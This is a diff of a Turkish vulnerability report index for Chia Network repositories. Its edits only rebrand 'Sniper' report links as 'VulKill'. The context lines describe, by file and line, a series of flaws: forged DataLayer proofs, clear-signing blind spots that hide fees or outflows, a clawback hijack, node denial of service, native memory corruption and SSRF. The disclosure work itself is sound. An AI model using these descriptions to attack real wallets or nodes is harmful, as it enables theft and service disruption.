 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`), `chia/data_layer/data_layer_util.py`
 * **Zafiyet Sınıfı & Skor:** `CWE-347 / CWE-345` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `WalletRpcApi.dl_verify_proof` İçinde Coin'in Gerçek Singleton Olup Olmadığının Kontrol Edilmemesi (`chia/rpc/wallet_rpc_api.py:4066-4120`):** Chia DataLayer, kurumların zincir üstünde resmi veri kayıtları (karbon kredisi sicili, RWA teminat tablosu, köprü rezerv kaydı) tuttuğu sistemdir. `dl_verify_proof` RPC'si kendisine verilen kanıttaki coin'in zincirde var olduğunu ve Merkle kökünü kontrol eder; ancak **bu coin'in gerçekten o kurumun resmi DataLayer Singleton'ı (`match_dl_singleton` ve `store_id` soy kütüğü) olup olmadığını hiç kontrol etmez!**
@@ -2331,7 +2331,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-driver/src/clear_signing/tests.rs`
 * **Zafiyet Sınıfı & Skor:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Konsensüs Motoru (`chia_rs`) İle Clear-Signing Ayrıştırıcısı Arasındaki Uyumsuzluk (`clear_signing.rs`):** Chia konsensüs motoru CLVM koşullarının sonuna fazladan bir atom eklendiğinde (örneğin `(52 750_XCH extra_atom)`) bunu geçerli bir `RESERVE_FEE` komutu olarak çalıştırır. Buna karşılık `cni-wallet-sdk` sabit uzunluklu ayrıştırıcı kullandığı için bu koşulu `Condition::Other` olarak sınıflandırır ve hata vermeden yok sayar!
@@ -2389,7 +2389,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation)
 * **Zafiyet Sınıfı & Skor:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — NFT Katmanının Metadata Güncelleyici Programdan Dönen Koşulları Çalıştırması:** Chia NFT standardında `NEW_METADATA_INFO` (`-24`) koşulu çalıştırıldığında, metadata güncelleyici programın döndürdüğü ek CLVM koşulları da konsensüs tarafından doğrudan yürütülür.
@@ -2440,7 +2440,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation)
 * **Zafiyet Sınıfı & Skor:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Çok Bacaklı Teklif (Offer) Hesaplamasında Kesişim (`Intersection`) Kullanılması (`clear_signing.rs`):** Bir kasa işlemi birden fazla bağımlı settlement (takas) bacağı içerdiğinde (`POC-4`), `cni-wallet-sdk` tüm ödemelerin birleşimini (`union`) almak yerine kümelerin kesişimini alır.
@@ -2490,7 +2490,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling)
 * **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `SETTLEMENT_PAYMENT_HASH` Coin'lerinin Ek İmza Gerektirmeden Harcanabilmesi:** Kasa harcaması içinden `SETTLEMENT_PAYMENT_HASH` adresine bir coin oluşturulduğunda, bu settlement coin'in harcanması için kasanın ek bir BLS imzasına ihtiyaç yoktur.
@@ -2542,7 +2542,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (`chia-sdk-driver` & `chia-sdk-bindings` FFI): chia-sdk-bindings`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`)
 * **Zafiyet Sınıfı & Skor:** `CWE-682 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Kasaya Ait Olmayan Harici `DropCoin` Çıktısının 'Kasaya Dönen Para Üstü (Change)' Sayılması (`clear_signing.rs` & `chia-sdk-bindings/src/clear_signing.rs:62`):** `parse_vault_transaction` fonksiyonu kasadan çıkan net parayı hesaplarken, kasa adresine gelen çıktıları 'para üstü (change)' olarak düşer; ancak bu çıktıyı üreten üst coin'in (`DropCoin`) gerçekten kasaya ait olup olmadığını kontrol etmez!
@@ -2597,7 +2597,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding)
 * **Zafiyet Sınıfı & Skor:** `CWE-347 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Ön-Bölme (`Pre-Split`) Ara Coin Çıktısının Son Alıcıya Kriptografik Olarak Bağlanmaması (`clear_signing.rs`):** Kullanıcı `1.000 XCH` (`1,000,000,000,000,000 mojo`) tutarındaki bir Offer ön-bölme paketini (`476b8e836e435eec...`, `1.994 bayt`) imzalarken, Clear-Signing ara coin harcamasının kasanın imzaladığı bir anonsla (`ASSERT_PUZZLE_ANNOUNCEMENT`) kilitlenip kilitlenmediğini doğrulamaz.
@@ -2650,7 +2650,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check)
 * **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Clawback `sender_puzzle_hash` (İptal Yetkilisi) Alanının Kasa Adresiyle Karşılaştırılmaması (`clear_signing.rs`):** Bir kasa Clawback korumalı bir ödeme oluşturduğunda (`POC-8`), `cni-wallet-sdk` Clawback yapısını ayrıştırırken `sender_puzzle_hash` (yani süre dolmadan parayı geri çekme/iptal etme yetkisine sahip adres) alanının gerçekten imzalayan kasaya ait olup olmadığını kontrol etmez!
@@ -2701,7 +2701,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting)
 * **Zafiyet Sınıfı & Skor:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Chia CAT Halkasında (Ring) Değer Korunumunun Tüm Halka Boyunca Hesaplanması:** Chia CAT standardında aynı halkadaki coin harcamaları birbirinin açığını/fazlasını dengeler; halkadaki harici bir coin `RUN_TAIL` (`51 0 -113`) ile token erittiğinde (melt) bu fark kasanın harcadığı CAT coin'inden karşılanır.
@@ -2751,7 +2751,7 @@ cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.tom
 * **Hedef Depo & Paket:** `Chia-Network/chia-vault-recover` (`Cargo / Rust (Chia Emergency Vault Recovery CLI): chia-vault-recover`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)` — `src/locate.rs:148-219` (`find_launcher_id`)
 * **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `find_launcher_id` İçinde İlk Bulunan `SINGLETON_LAUNCHER_HASH` Kaydının Doğrulanmadan Seçilmesi (`src/locate.rs:148-219`):** `chia-vault-recover` aracı kullanıcının kasasını bulmak için adresteki tüm coin'leri sorgular, üst harcamalarına bakar ve `SINGLETON_LAUNCHER_HASH` tipindeki **ilk** alt coin'i kullanıcının kasası kabul ederek döner.
@@ -2810,7 +2810,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`)
 * **Zafiyet Sınıfı & Skor:** `CWE-400 / CWE-345` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Port `8444` Üzerinde Hatalı Senkronizasyon Verisi Gönderen Eşin (Peer) Engellenmemesi (`chia/full_node/full_node.py:2220-2310`):** Kimlik doğrulamasız P2P (`8444` mTLS 1.3) ağından bağlanan bir saldırgan sahte `NewPeak` duyurup `sync_from_fork_point` sırasında bozuk sub-epoch / weight-proof yanıtı döndüğünde, `FullNode` senkronizasyonu iptal eder ancak saldırgan bağlantısını kesmez.
@@ -2873,7 +2873,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py` (`take_offer`), `chia/wallet/trade_manager.py` (`respond_to_offer`)
 * **Zafiyet Sınıfı & Skor:** `CWE-863` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Teklif (`Offer`) Kabul Edilirken Otomatik Coin Seçimi (`trade_manager.py` & `wallet_rpc_api.py`):** `take_offer` çağrıldığında `respond_to_offer` teklifte talep edilen ödemeleri karşılamak için cüzdandan otomatik olarak `select_coins` ile coin seçer ve `sign_coin_spends` ile imzalar.
@@ -2894,7 +2894,7 @@ async def respond_to_offer(self, offer: Offer, peer: WSChiaConnection, ...):
 
 #### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
 ```bash
-# 1. Run Sniper's Cryptographic Wallet Signing Auditor & Offer Cap Verification
+# 1. Run VulKill's Cryptographic Wallet Signing Auditor & Offer Cap Verification
 python3 -m unittest /home/community-user/targets/sniper/tests/test_wave5_orchestrator_and_wallet.py
 ```
 **Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
@@ -2923,7 +2923,7 @@ python3 -m unittest /home/community-user/targets/sniper/tests/test_wave5_orchest
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python & Rust FFI (`chia-blockchain` & `chiapos`): chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11` — `chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`), `chiapos` Rust FFI (`size_v2` / `get_quality_string`)
 * **Zafiyet Sınıfı & Skor:** `CWE-248 / CWE-20` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Port `8444` (`FullNode`) İle Port `8447` (`FarmerAPI`) Arasındaki Doğrulama Farkı (`chia/farmer/farmer_api.py:85-185`):** Port `8444` üzerindeki `FullNode` gelen kanıtları `verify_and_get_quality_string` ile kontrol ederken, Port `8447` üzerindeki `FarmerAPI.new_proof_of_space` ağdan gelen `NewProofOfSpace` paketini hiçbir ön kontrolden geçirmeden doğrudan Rust/C++ FFI sınırındaki `proof.size_v2()` ve `get_quality_string()` fonksiyonlarına verir.
@@ -2985,7 +2985,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/chiapos` (`PyPI / C++17 Native Extension (`chiapos`): chiapos`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.0.11 (upstream main)` — `src/verifier.hpp:48-108` (`Verifier::ValidateProof`), `src/bits.hpp:184`, `src/prover_disk.hpp:254-322` (`DiskProver`)
 * **Zafiyet Sınıfı & Skor:** `CWE-190 / CWE-787 / CWE-125` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Konsensüsün İzin Verdiği `k=50` Değerinde `Verifier::ValidateProof` C++ Yığın Sınır Aşımı (`src/verifier.hpp:48-108` & `src/bits.hpp:184`):** Chia'nın Python katmanındaki `check_plot_param` fonksiyonu `k <= 50` değerine izin verir. Ancak C++ katmanındaki `Verifier::ValidateProof` içinde `k=50` (Tablo 4) ve `k=60` (Tablo 1) değerleri `src/bits.hpp:184` satırında bit kaydırma ve yığın (stack) sınır aşımı (`runtime error: load of address ... with insufficient space` / `AddressSanitizer: stack-buffer-overflow`, `exit_code=1`) tetikler.
@@ -3040,7 +3040,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/chiavdf` (`PyPI / C++17 Native Extension (`chiavdf`): chiavdf`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 1.1.11 (upstream main)` — `src/verifier.cpp` (`CheckProofOfTimeNWesolowski`), `src/prover_slow.h`
 * **Zafiyet Sınıfı & Skor:** `CWE-125 / CWE-416` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `CheckProofOfTimeNWesolowski` İçinde `proof_blob` Uzunluk ve Segment Sınırlarının Kontrol Edilmemesi (`src/verifier.cpp`):** N-Wesolowski zaman kanıtı (VDF) doğrulanırken `CheckProofOfTimeNWesolowski`, `proof_blob` dizisini sabit `2 * B_bytes` adımlarla okur; ancak tampon boyutunun segment sayısına yetip yetmediğini ve `num_iterations > 0` koşulunu kontrol etmez.
@@ -3091,7 +3091,7 @@ grep -n -C 12 "CheckProofOfTimeNWesolowski" /home/community-user/targets/chiavdf
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/data_layer/download_data.py`, `chia/data_layer/data_layer.py`
 * **Zafiyet Sınıfı & Skor:** `CWE-918` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)
 
